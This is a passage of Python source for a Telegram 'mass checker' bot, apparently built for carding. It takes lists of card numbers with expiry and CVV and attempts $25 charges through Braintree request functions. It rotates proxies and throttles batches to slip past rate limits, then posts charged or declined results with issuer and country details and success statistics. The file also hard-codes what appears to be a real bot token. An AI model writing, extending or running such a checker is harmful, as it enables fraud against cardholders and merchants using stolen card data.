    initial_msg = await context.bot.send_message(chat_id=update.effective_chat.id, text=initial_message, parse_mode='HTML')

    # Start timing
    start_time = time.time()

    # Get a single proxy for this request
    proxies = get_unique_proxies(1)
    if not proxies:
        await initial_msg.edit_text("Not enough valid proxies available. Please add more proxies to proxies.txt.")
        return
    proxy = proxies[0]

    # Process the card
    tkn, mm, yy, bin, card_type, lastfour, lasttwo, bin_data = await run_sync_func(b3req, card_number, expiry_month, expiry_year, proxy)
    if tkn is None:
        await initial_msg.edit_text("Error processing card.")
        return
    final = await run_sync_func(brainmarkreq, tkn, mm, yy, bin, card_type, lastfour, lasttwo, proxy)

    # End timing
    end_time = time.time()
    duration = end_time - start_time

    # Get user name and ID for profile link
    user_name = update.effective_user.first_name or update.effective_user.username or "Unknown User"
    user_id = update.effective_user.id
    profile_link = f"tg://user?id={user_id}"  # Link to user's Telegram profile

    # Extract card info from bin_data
    info = card_type.upper() if card_type else "Unknown"
    is_debit = bin_data.get('debit', 'Unknown') if bin_data else 'Unknown'
    is_credit = 'No' if is_debit == 'Yes' else 'Yes'  # Assuming mutually exclusive for simplicity
    card_type_details = f"{info} (Debit: {is_debit}, Credit: {is_credit})"
    issuer = bin_data.get('issuingBank', 'Unknown') if bin_data else 'Unknown'
    issuer_formatted = f"({issuer}) 🏛" if issuer != 'Unknown' else 'Unknown'
    country_code = bin_data.get('countryOfIssuance', 'USA').upper() if bin_data else 'USA'
    # Mapping country codes to full names and flags (expanded)
    country_mapping = {
        'USA': ('United States', '🇺🇸'),
        'THA': ('Thailand', '🇹🇭'),
        'IND': ('India', '🇮🇳'),
        'GBR': ('United Kingdom', '🇬🇧'),
        'CAN': ('Canada', '🇨🇦'),
        'AUS': ('Australia', '🇦🇺'),
        'FRA': ('France', '🇫🇷'),
        'DEU': ('Germany', '🇩🇪'),
        'JPN': ('Japan', '🇯🇵'),
        'CHN': ('China', '🇨🇳'),
    }
    country_full, country_flag = country_mapping.get(country_code, ('Unknown', '🇺🇳'))

    if is_charged(final):
        response_message = f"""
𝗖𝗛𝗔𝗥𝗚𝗘𝗗 25$ 😈⚡

𝗖𝗮𝗿𝗱: {full_card_details}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆: Braintree 25$
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: CHARGED 25$😈⚡

𝗜𝗻𝗳𝗼: {card_type_details}
𝗜𝘀𝘀𝘂𝗲𝗿: {issuer_formatted}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_full} {country_flag}

𝗧𝗶𝗺𝗲: {duration:.2f} seconds
𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: <a href="{profile_link}">{user_name}</a>
"""
        await initial_msg.edit_text(response_message, parse_mode='HTML')
    else:
        response_message = f"""
𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱❌

𝗖𝗮𝗿𝗱: {full_card_details}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆: Braintree 25$
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {final}

𝗜𝗻𝗳𝗼: {card_type_details}
𝗜𝘀𝘀𝘂𝗲𝗿: {issuer_formatted}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_full} {country_flag}

𝗧𝗶𝗺𝗲: {duration:.2f} seconds
𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: <a href="{profile_link}">{user_name}</a>
"""
        await initial_msg.edit_text(response_message, parse_mode='HTML')

# Handle /mchk command for checking multiple cards
async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global checking_active, stats
    message_text = update.message.text
    lines = message_text.split('\n')[1:]  # Skip the /mchk line
    if not lines:
        await update.message.reply_text("Usage: /mchk\n<cc1|mm|yy|cvv>\n<cc2|mm|yy|cvv>...")
        return
    checking_active = True
    stats['start_time'] = time.time()
    stats['total'] = len(lines)
    stats['checked'] = 0
    stats['approved'] = 0
    stats['declined'] = 0

    # Developer and Bot links
    dev_name = "𓆰𝅃꯭᳚⚡!! ⏤‌‌‌‌𝐅ɴ x EʟᴇᴄᴛʀᴀOᴘ𓆪𓆪⏤‌‌➤⃟🔥✘"
    dev_link = "https://t.me/FNxELECTRA"  # Replace with actual developer Telegram link

    # Process cards in batches of 3
    batch_size = 3
    for i in range(0, len(lines), batch_size):
        if not checking_active:
            break

        batch = lines[i:i + batch_size]
        # Filter out invalid lines
        batch = [line for line in batch if '|' in line and len(line.split('|')) == 4]
        if not batch:
            continue

        # Get unique proxies for this batch
        proxies = get_unique_proxies(len(batch))
        if not proxies:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="Not enough valid proxies available to process this batch. Please add more proxies to proxies.txt.")
            checking_active = False
            return

        # Process the batch concurrently
        tasks = []
        for card, proxy in zip(batch, proxies):
            card_number, expiry_month, expiry_year, _ = card.split('|')
            logger.debug(f"Processing card from mchk: {card_number}|{expiry_month}|{expiry_year}")
            tasks.append(process_card(card, proxy, update, context))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Process the results
        for result in results:
            if isinstance(result, Exception):
                logger.error(f"Error processing card: {result}")
                stats['declined'] += 1
                stats['checked'] += 1
                continue

            if result[0] is None:  # Card processing failed
                stats['declined'] += 1
                stats['checked'] += 1
                continue

            full_card, final, _, _ = result
            stats['checked'] += 1
            if is_charged(final):
                stats['approved'] += 1
                await context.bot.send_message(chat_id=update.effective_chat.id, text=f"<b>Charged✅</b> {full_card.split('|')[0]}", parse_mode='HTML')
            else:
                stats['declined'] += 1
                await context.bot.send_message(chat_id=update.effective_chat.id, text=f"{final} {full_card.split('|')[0]}")

        # Send progress update every 50 cards or at the end
        if stats['checked'] % 50 == 0 or stats['checked'] == stats['total']:
            duration = time.time() - stats['start_time']
            avg_speed = stats['checked'] / duration if duration > 0 else 0
            success_rate = (stats['approved'] / stats['checked'] * 100) if stats['checked'] > 0 else 0
            progress_message = f"""
<b>[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐋𝐈𝐕𝐄 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒 😈⚡</b>
━━━━━━━━━━━━━━━━━━━━━━
<b>[✪] 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝:</b> {stats['approved']}
<b>[✪] 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝:</b> {stats['declined']}
<b>[✪] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝:</b> {stats['checked']}/{stats['total']}
<b>[✪] 𝐓𝐨𝐭𝐚𝐥:</b> {stats['total']}
<b>[✪] 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧:</b> {duration:.2f} seconds
<b>[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝:</b> {avg_speed:.2f} cards/sec
<b>[✪] 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞:</b> {success_rate:.2f}%
━━━━━━━━━━━━━━━━━━━━━━
<b>[み] 𝐃𝐞𝐯: <a href="{dev_link}">{dev_name}</a> ⚡😈</b>
━━━━━━━━━━━━━━━━━━━━━━
"""
            await context.bot.send_message(chat_id=update.effective_chat.id, text=progress_message, parse_mode='HTML')

        # Wait for 45 seconds before processing the next batch
        if i + batch_size < len(lines):  # Only wait if there are more cards to process
            await context.bot.send_message(chat_id=update.effective_chat.id, text="Waiting 45 seconds to avoid rate limiting...")
            await asyncio.sleep(45)

    checking_active = False

# Handle /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📤 Upload Combo", callback_data='upload_combo')],
        [InlineKeyboardButton("⏹️ Cancel Check", callback_data='cancel_check')],
        [InlineKeyboardButton("📊 Live Stats", callback_data='live_stats')],
        [InlineKeyboardButton("? Help", callback_data='help')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🔥 Welcome To FN MASS CHR BOT! 🔥\n"
        "🔍 Use /chk To Check Single CC\n"
        "📤 Send Combo File Or Else Use Button Below:",
        reply_markup=reply_markup
    )

# Handle button clicks
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global checking_active
    query = update.callback_query
    await query.answer()

    # Developer and Bot links
    dev_name = "𓆰𝅃꯭᳚⚡!! ⏤‌‌‌‌𝐅ɴ x EʟᴇᴄᴛʀᴀOᴘ𓆪𓆪⏤‌‌➤⃟🔥✘"
    dev_link = "https://t.me/FNxELECTRA"  # Replace with actual developer Telegram link

    if query.data == 'upload_combo':
        await query.edit_message_text("📤 Please upload your combo file (.txt)")
    elif query.data == 'cancel_check':
        checking_active = False
        await query.edit_message_text("⏹️ Checking cancelled!🛑")
    elif query.data == 'live_stats':
        duration = time.time() - stats['start_time'] if stats['start_time'] > 0 else 0
        avg_speed = stats['checked'] / duration if duration > 0 else 0
        success_rate = (stats['approved'] / stats['checked'] * 100) if stats['checked'] > 0 else 0
        stats_message = f"""
━━━━━━━━━━━━━━━━━━━━━━
[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐒𝐓𝐀𝐓𝐈𝐂𝐒 😈⚡
━━━━━━━━━━━━━━━━━━━━━━
[✪] 𝐂𝐡𝐚𝐫𝐠𝐞𝐝: {stats['approved']}
[❌] 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {stats['declined']}
[✪] 𝐓𝐨𝐭𝐚𝐥: {stats['total']}
[✪] 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {duration:.2f} seconds
[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝: {avg_speed:.2f} cards/sec
[✪] 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞: {success_rate:.2f}%
━━━━━━━━━━━━━━━━━━━━━━
[み] 𝐃𝐞𝐯: <a href="{dev_link}">{dev_name}</a> ⚡😈
━━━━━━━━━━━━━━━━━━━━━━
"""
        await query.edit_message_text(stats_message, parse_mode='HTML')
    elif query.data == 'help':
        await query.edit_message_text("Help: Use /chk <cc|mm|yy|cvv> for single check or upload a .txt file with combos.")

# Handle /stop command
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global checking_active
    checking_active = False
    await update.message.reply_text("⏹️ Process Stopped!🛑")

# Main bot setup and execution
if __name__ == '__main__':
    # Load proxies before starting the bot
    if not load_proxies():
        logger.error("Proxies not set or expired. Please set valid proxies in proxies.txt before continuing.")
        exit(1)

    app = ApplicationBuilder().token('7748515975:AAHyGpFl4HXLLud45VS4v4vMkLfOiA6YNSs').build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("chk", chk))
    app.add_handler(CommandHandler("mchk", mchk))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.Command(), start))  # Fallback for commands
    app.add_handler(CallbackQueryHandler(button))
    app.run_polling()